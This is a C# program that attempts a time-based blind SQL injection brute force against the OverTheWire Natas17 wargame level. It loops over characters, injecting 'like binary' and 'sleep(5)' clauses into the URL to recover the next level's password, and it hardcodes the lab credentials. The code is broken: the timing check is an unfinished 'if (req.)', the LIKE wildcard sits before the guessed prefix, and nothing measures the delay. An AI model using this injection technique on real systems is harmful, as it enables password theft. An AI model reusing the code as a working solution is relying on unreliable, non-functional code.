using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;

namespace BruteNatas3
{
    class Program
    {
        static void Main(string[] args)
        {
            string html;
            string sumvols = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            string passwd = "";
            for (int i = 0; i < 50; i++)
            {

                for (int z = 0; z < sumvols.Length; z++)
                {

                    
                    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create($"http://natas17.natas.labs.overthewire.org/index.php?debug=1&username=natas18%22%20and%20password%20%20like%20binary%20%27%25{passwd+sumvols.ElementAt(z)}%27%20and%20sleep(5)%23");
                    request.Credentials = new NetworkCredential("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw");
                   
                    using (HttpWebResponse req = (HttpWebResponse)request.GetResponse())
                    {
                       
                        if (req.)
                        {
                            passwd += sumvols.ElementAt(z);
                            Console.WriteLine(passwd);
                            break;
                        }
                    }
                }

            }
            Console.ReadLine();
        }
    }
}
